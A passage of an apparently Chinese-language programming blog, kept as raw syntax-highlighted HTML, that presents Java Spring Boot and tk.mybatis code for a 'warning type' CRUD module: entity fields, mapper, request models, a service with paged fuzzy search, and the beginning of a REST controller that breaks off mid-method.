punctuation">@Column</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"YJLX_Create_User_Id"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ApiModelProperty</span><span class="token punctuation">(</span>value<span class="token operator">=</span><span class="token string">"创建用户编号"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> Integer createUserId<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/**     * 创建用户名称     */</span>    <span class="token annotation punctuation">@Column</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"YJLX_Create_User_Name"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ApiModelProperty</span><span class="token punctuation">(</span>value<span class="token operator">=</span><span class="token string">"创建用户名称"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> String createUserName<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/**     * 更新时间     */</span>    <span class="token annotation punctuation">@Column</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"YJLX_Update_Time"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ApiModelProperty</span><span class="token punctuation">(</span>value<span class="token operator">=</span><span class="token string">"更新时间"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> Date updateTime<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/**     * 更新用户编号     */</span>    <span class="token annotation punctuation">@Column</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"YJLX_Update_User_Id"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ApiModelProperty</span><span class="token punctuation">(</span>value<span class="token operator">=</span><span class="token string">"更新用户编号"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> Integer updateUserId<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/**     * 更新用户名称     */</span>    <span class="token annotation punctuation">@Column</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"YJLX_Update_User_Name"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ApiModelProperty</span><span class="token punctuation">(</span>value<span class="token operator">=</span><span class="token string">"更新用户名称"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> String updateUserName<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">long</span> serialVersionUID <span class="token operator">=</span> 1L<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="Mapper类"><a href="#Mapper类" class="headerlink" title="Mapper类"></a>Mapper类</h3><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>psds<span class="token punctuation">.</span>credit<span class="token punctuation">.</span>mapper<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>psds<span class="token punctuation">.</span>credit<span class="token punctuation">.</span>entity<span class="token punctuation">.</span>WarningType<span class="token punctuation">;</span><span class="token keyword">import</span> tk<span class="token punctuation">.</span>mybatis<span class="token punctuation">.</span>mapper<span class="token punctuation">.</span>common<span class="token punctuation">.</span>Mapper<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">WarningTypeMapper</span> <span class="token keyword">extends</span> <span class="token class-name">Mapper</span><span class="token operator">&lt;</span>WarningType<span class="token operator">></span> <span class="token punctuation">{</span><span class="token punctuation">}</span></code></pre><h3 id="Model类"><a href="#Model类" class="headerlink" title="Model类"></a>Model类</h3><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>psds<span class="token punctuation">.</span>credit<span class="token punctuation">.</span>model<span class="token punctuation">;</span><span class="token keyword">import</span> io<span class="token punctuation">.</span>swagger<span class="token punctuation">.</span>annotations<span class="token punctuation">.</span>ApiModel<span class="token punctuation">;</span><span class="token keyword">import</span> io<span class="token punctuation">.</span>swagger<span class="token punctuation">.</span>annotations<span class="token punctuation">.</span>ApiModelProperty<span class="token punctuation">;</span><span class="token keyword">import</span> lombok<span class="token punctuation">.</span>Data<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>validation<span class="token punctuation">.</span>constraints<span class="token punctuation">.</span>NotBlank<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>Serializable<span class="token punctuation">;</span><span class="token comment" spellcheck="true">/** * @author czm * @Date 2021年9月16日, 0019 */</span><span class="token annotation punctuation">@ApiModel</span><span class="token punctuation">(</span><span class="token string">"新增预警类型请求类"</span><span class="token punctuation">)</span><span class="token annotation punctuation">@Data</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">WarningTypeAddBody</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">long</span> serialVersionUID <span class="token operator">=</span> <span class="token operator">-</span>7931205996167983238L<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/**     * 预警类型编码     */</span>    <span class="token annotation punctuation">@ApiModelProperty</span><span class="token punctuation">(</span>value<span class="token operator">=</span><span class="token string">"预警类型编码"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@NotBlank</span><span class="token punctuation">(</span>message <span class="token operator">=</span> <span class="token string">"预警类型编码不能为空"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> String warningTypeCode<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/**     * 预警类型名称     */</span>    <span class="token annotation punctuation">@ApiModelProperty</span><span class="token punctuation">(</span>value<span class="token operator">=</span><span class="token string">"预警类型名称"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@NotBlank</span><span class="token punctuation">(</span>message <span class="token operator">=</span> <span class="token string">"预警类型名称不能为空"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> String warningTypName<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/**     * 预警类型说明     */</span>    <span class="token annotation punctuation">@ApiModelProperty</span><span class="token punctuation">(</span>value<span class="token operator">=</span><span class="token string">"预警类型说明"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> String warningTypeContext<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>psds<span class="token punctuation">.</span>credit<span class="token punctuation">.</span>model<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>psds<span class="token punctuation">.</span>credit<span class="token punctuation">.</span>framework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span>model<span class="token punctuation">.</span>BaseRequest<span class="token punctuation">;</span><span class="token keyword">import</span> io<span class="token punctuation">.</span>swagger<span class="token punctuation">.</span>annotations<span class="token punctuation">.</span>ApiModel<span class="token punctuation">;</span><span class="token keyword">import</span> io<span class="token punctuation">.</span>swagger<span class="token punctuation">.</span>annotations<span class="token punctuation">.</span>ApiModelProperty<span class="token punctuation">;</span><span class="token keyword">import</span> lombok<span class="token punctuation">.</span>Data<span class="token punctuation">;</span><span class="token comment" spellcheck="true">/** * @author czm * @Date 2021年9月16日, 0019 */</span><span class="token annotation punctuation">@ApiModel</span><span class="token punctuation">(</span><span class="token string">"模糊查询预警类型请求类"</span><span class="token punctuation">)</span><span class="token annotation punctuation">@Data</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">WarningTypeFindByKey</span> <span class="token keyword">extends</span> <span class="token class-name">BaseRequest</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">long</span> serialVersionUID <span class="token operator">=</span> <span class="token operator">-</span>3343948693858710848L<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/**     * 预警类型编码     */</span>    <span class="token annotation punctuation">@ApiModelProperty</span><span class="token punctuation">(</span>value<span class="token operator">=</span><span class="token string">"预警类型编码"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> String warningTypeCode<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/**     * 预警类型名称     */</span>    <span class="token annotation punctuation">@ApiModelProperty</span><span class="token punctuation">(</span>value<span class="token operator">=</span><span class="token string">"预警类型名称"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> String warningTypeName<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/**     * 预警类型说明     */</span>    <span class="token annotation punctuation">@ApiModelProperty</span><span class="token punctuation">(</span>value<span class="token operator">=</span><span class="token string">"预警类型说明"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> String warningTypeContext<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>psds<span class="token punctuation">.</span>credit<span class="token punctuation">.</span>model<span class="token punctuation">;</span><span class="token keyword">import</span> io<span class="token punctuation">.</span>swagger<span class="token punctuation">.</span>annotations<span class="token punctuation">.</span>ApiModel<span class="token punctuation">;</span><span class="token keyword">import</span> io<span class="token punctuation">.</span>swagger<span class="token punctuation">.</span>annotations<span class="token punctuation">.</span>ApiModelProperty<span class="token punctuation">;</span><span class="token keyword">import</span> lombok<span class="token punctuation">.</span>Data<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>validation<span class="token punctuation">.</span>constraints<span class="token punctuation">.</span>NotBlank<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>Serializable<span class="token punctuation">;</span><span class="token comment" spellcheck="true">/** * @author czm * @Date 2021年9月16日, 0019 */</span><span class="token annotation punctuation">@ApiModel</span><span class="token punctuation">(</span><span class="token string">"预警类型修改请求类"</span><span class="token punctuation">)</span><span class="token annotation punctuation">@Data</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">WarningTypeUpdBody</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">long</span> serialVersionUID <span class="token operator">=</span> 7212177218485625148L<span class="token punctuation">;</span>    <span class="token annotation punctuation">@ApiModelProperty</span><span class="token punctuation">(</span>value<span class="token operator">=</span><span class="token string">"预警类型主键"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> Integer warningTypeId<span class="token punctuation">;</span>    <span class="token annotation punctuation">@ApiModelProperty</span><span class="token punctuation">(</span>value<span class="token operator">=</span><span class="token string">"预警类型编码"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@NotBlank</span><span class="token punctuation">(</span>message <span class="token operator">=</span> <span class="token string">"预警类型编码不能为空"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> String warningTypeCode<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/**     * 预警类型名称     */</span>    <span class="token annotation punctuation">@ApiModelProperty</span><span class="token punctuation">(</span>value<span class="token operator">=</span><span class="token string">"预警类型名称"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@NotBlank</span><span class="token punctuation">(</span>message <span class="token operator">=</span> <span class="token string">"预警类型名称不能为空"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> String warningTypeName<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/**     * 预警类型说明     */</span>    <span class="token annotation punctuation">@ApiModelProperty</span><span class="token punctuation">(</span>value<span class="token operator">=</span><span class="token string">"预警类型说明"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> String warningTypeContext<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="Service类"><a href="#Service类" class="headerlink" title="Service类"></a>Service类</h3><pre class=" language-java"><code class="language-java">1package com<span class="token punctuation">.</span>psds<span class="token punctuation">.</span>credit<span class="token punctuation">.</span>service<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>baomidou<span class="token punctuation">.</span>dynamic<span class="token punctuation">.</span>datasource<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>DS<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>github<span class="token punctuation">.</span>pagehelper<span class="token punctuation">.</span>PageHelper<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>github<span class="token punctuation">.</span>pagehelper<span class="token punctuation">.</span>PageInfo<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>psds<span class="token punctuation">.</span>credit<span class="token punctuation">.</span>entity<span class="token punctuation">.</span>WarningType<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>psds<span class="token punctuation">.</span>credit<span class="token punctuation">.</span>mapper<span class="token punctuation">.</span>WarningTypeMapper<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>psds<span class="token punctuation">.</span>credit<span class="token punctuation">.</span>model<span class="token punctuation">.</span>WarningTypeFindByKey<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>lang3<span class="token punctuation">.</span>StringUtils<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span>Service<span class="token punctuation">;</span><span class="token keyword">import</span> tk<span class="token punctuation">.</span>mybatis<span class="token punctuation">.</span>mapper<span class="token punctuation">.</span>entity<span class="token punctuation">.</span>Example<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>Resource<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>List<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Optional<span class="token punctuation">;</span><span class="token comment" spellcheck="true">/** * 预警类型管理 * @author czm * @Date 2021年9月16日, 0019 */</span><span class="token annotation punctuation">@Service</span><span class="token annotation punctuation">@DS</span><span class="token punctuation">(</span><span class="token string">"XYYJ"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">WarningTypeService</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Resource</span>    <span class="token keyword">private</span> WarningTypeMapper warningTypeMapper<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/**     * 新增预警类型     *     * @param warningType:     * @return     */</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">addWarningType</span><span class="token punctuation">(</span>WarningType warningType<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> warningTypeMapper<span class="token punctuation">.</span><span class="token function">insertSelective</span><span class="token punctuation">(</span>warningType<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * 删除预警类型     *     * @param id:     * @return     */</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">delWarningType</span><span class="token punctuation">(</span>Integer id<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> warningTypeMapper<span class="token punctuation">.</span><span class="token function">deleteByPrimaryKey</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * 修改预警类型     *     * @param warningType:     * @return     */</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">updateWarningType</span><span class="token punctuation">(</span>WarningType warningType<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> warningTypeMapper<span class="token punctuation">.</span><span class="token function">updateByPrimaryKeySelective</span><span class="token punctuation">(</span>warningType<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * 根据id查询预警类型     *     * @param id:     * @return     */</span>    <span class="token keyword">public</span> Optional<span class="token operator">&lt;</span>WarningType<span class="token operator">></span> <span class="token function">findWarningTypeById</span><span class="token punctuation">(</span>Integer id<span class="token punctuation">)</span> <span class="token punctuation">{</span>        WarningType warningType <span class="token operator">=</span> warningTypeMapper<span class="token punctuation">.</span><span class="token function">selectByPrimaryKey</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> Optional<span class="token punctuation">.</span><span class="token function">ofNullable</span><span class="token punctuation">(</span>warningType<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * 查询所有预警类型     *     * @param :     * @return     */</span>    <span class="token keyword">public</span> PageInfo<span class="token operator">&lt;</span>WarningType<span class="token operator">></span> <span class="token function">getWarningTypeList</span><span class="token punctuation">(</span>WarningTypeFindByKey req<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Example example <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Example</span><span class="token punctuation">(</span>WarningType<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Example<span class="token punctuation">.</span>Criteria criteria <span class="token operator">=</span> example<span class="token punctuation">.</span><span class="token function">createCriteria</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>StringUtils<span class="token punctuation">.</span><span class="token function">isNotBlank</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span><span class="token function">getWarningTypeCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            criteria<span class="token punctuation">.</span><span class="token function">andLike</span><span class="token punctuation">(</span><span class="token string">"warningTypeCode"</span><span class="token punctuation">,</span> <span class="token string">"%"</span><span class="token operator">+</span>req<span class="token punctuation">.</span><span class="token function">getWarningTypeCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"%"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>StringUtils<span class="token punctuation">.</span><span class="token function">isNotBlank</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span><span class="token function">getWarningTypeName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            criteria<span class="token punctuation">.</span><span class="token function">andLike</span><span class="token punctuation">(</span><span class="token string">"warningTypeName"</span><span class="token punctuation">,</span> <span class="token string">"%"</span><span class="token operator">+</span>req<span class="token punctuation">.</span><span class="token function">getWarningTypeName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"%"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>StringUtils<span class="token punctuation">.</span><span class="token function">isNotBlank</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span><span class="token function">getOrderField</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//用户自定义排序</span>            Example<span class="token punctuation">.</span>OrderBy orderBy <span class="token operator">=</span> example<span class="token punctuation">.</span><span class="token function">orderBy</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span><span class="token function">getOrderField</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>StringUtils<span class="token punctuation">.</span><span class="token function">isNotBlank</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span><span class="token function">getOrderSort</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"asc"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span><span class="token function">getOrderSort</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    orderBy<span class="token punctuation">.</span><span class="token function">asc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                    orderBy<span class="token punctuation">.</span><span class="token function">desc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//设置默认排序</span>            example<span class="token punctuation">.</span><span class="token function">orderBy</span><span class="token punctuation">(</span><span class="token string">"warningTypeId"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">desc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        PageHelper<span class="token punctuation">.</span><span class="token function">startPage</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span><span class="token function">getPageNo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> req<span class="token punctuation">.</span><span class="token function">getPageSize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        List<span class="token operator">&lt;</span>WarningType<span class="token operator">></span> dataList <span class="token operator">=</span> warningTypeMapper<span class="token punctuation">.</span><span class="token function">selectByExample</span><span class="token punctuation">(</span>example<span class="token punctuation">)</span><span class="token punctuation">;</span>        PageInfo<span class="token operator">&lt;</span>WarningType<span class="token operator">></span> pageInfo <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PageInfo</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span>dataList<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> pageInfo<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="Controller类"><a href="#Controller类" class="headerlink" title="Controller类"></a>Controller类</h3><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>psds<span class="token punctuation">.</span>credit<span class="token punctuation">.</span>controller<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>JSONObject<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>github<span class="token punctuation">.</span>pagehelper<span class="token punctuation">.</span>PageInfo<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>psds<span class="token punctuation">.</span>credit<span class="token punctuation">.</span>common<span class="token punctuation">.</span>core<span class="token punctuation">.</span>controller<span class="token punctuation">.</span>BaseController<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>psds<span class="token punctuation">.</span>credit<span class="token punctuation">.</span>entity<span class="token punctuation">.</span>WarningType<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>psds<span class="token punctuation">.</span>credit<span class="token punctuation">.</span>framework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span>message<span class="token punctuation">.</span>CommonMessage<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>psds<span class="token punctuation">.</span>credit<span class="token punctuation">.</span>framework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span>message<span class="token punctuation">.</span>ResultData<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>psds<span class="token punctuation">.</span>credit<span class="token punctuation">.</span>model<span class="token punctuation">.</span>WarningTypeAddBody<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>psds<span class="token punctuation">.</span>credit<span class="token punctuation">.</span>model<span class="token punctuation">.</span>WarningTypeFindByKey<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>psds<span class="token punctuation">.</span>credit<span class="token punctuation">.</span>model<span class="token punctuation">.</span>WarningTypeUpdBody<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>psds<span class="token punctuation">.</span>credit<span class="token punctuation">.</span>service<span class="token punctuation">.</span>WarningTypeService<span class="token punctuation">;</span><span class="token keyword">import</span> io<span class="token punctuation">.</span>swagger<span class="token punctuation">.</span>annotations<span class="token punctuation">.</span>Api<span class="token punctuation">;</span><span class="token keyword">import</span> io<span class="token punctuation">.</span>swagger<span class="token punctuation">.</span>annotations<span class="token punctuation">.</span>ApiOperation<span class="token punctuation">;</span><span class="token keyword">import</span> lombok<span class="token punctuation">.</span>extern<span class="token punctuation">.</span>slf4j<span class="token punctuation">.</span>Slf4j<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>beans<span class="token punctuation">.</span>BeanUtils<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>Resource<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>validation<span class="token punctuation">.</span>Valid<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token comment" spellcheck="true">/** * @author czm * @Date 2021年9月16日, 0019 */</span><span class="token annotation punctuation">@Slf4j</span><span class="token annotation punctuation">@RestController</span><span class="token annotation punctuation">@Api</span><span class="token punctuation">(</span>tags <span class="token operator">=</span> <span class="token string">"预警类型管理"</span><span class="token punctuation">)</span><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"warningType"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">WarningTypeController</span> <span class="token keyword">extends</span> <span class="token class-name">BaseController</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Resource</span>    <span class="token keyword">private</span> WarningTypeService warningTypeService<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/**     * 新增预警类型     *     * @param warningTypeAddBody:     * @return     */</span>    <span class="token annotation punctuation">@PostMapping</span><span class="token punctuation">(</span><span class="token string">"/addWarningType"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ApiOperation</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"新增预警类型"</span><span class="token punctuation">,</span> notes <span class="token operator">=</span> <span class="token string">"新增预警类型"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> ResultData<span class="token operator">&lt;</span>Boolean<span class="token operator">></span> <span class="token function">addWarningType</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestBody</span> <span class="token annotation punctuation">@Valid</span> WarningTypeAddBody warningTypeAddBody<span class="token punctuation">)</span> <span class="token punctuation">{</span>        log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"新增预警类型,请求参数:{}"</span><span class="token punctuation">,</span> JSONObject<span class="token punctuation">.</span><span class="token function">toJSONString</span><span class="token punctuation">(</span>warningTypeAddBody<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ResultData<span class="token operator">&lt;</span>Boolean<span class="token operator">></span> resultData <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResultData</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span>CommonMessage<span class="token punctuation">.</span>ERROR<span class="token punctuation">,</span> <span class="token string">"操作失败"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        resultData<span class="token punctuation">.</span><span class="token function">setData</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            WarningType warningType <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WarningType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            BeanUtils<span class="token punctuation">.</span><span class="token function">copyProperties</span><span class="token punctuation">(</span>warningTypeAddBody<span class="token punctuation">,</span> warningType<span class="token punctuation">)</span><span class="token punctuation">;</span>            warningType<span class="token punctuation">.</span><span class="token function">setCreateTime</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            warningType<span class="token punctuation">.</span><span class="token function">setCreateUserName</span><span class="token punctuation">(</span><span class="token function">getUsername</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            warningType<span class="token punctuation">.</span><span class="token function">setCreateUserId</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">toIntExact</span><span class="token punctuation">(</span><span class="token function">getUserId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">boolean</span> bRtn <span class="token operator">=</span> warningTypeService<span class="token punctuation">.</span><span class="token function">addWarningType</span><span class="token punctuation">(</span>warningType<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>bRtn<span class="token punctuation">)</span> <span class="token punctuation">{</span>                resultData<span class="token punctuation">.</span><span class="token 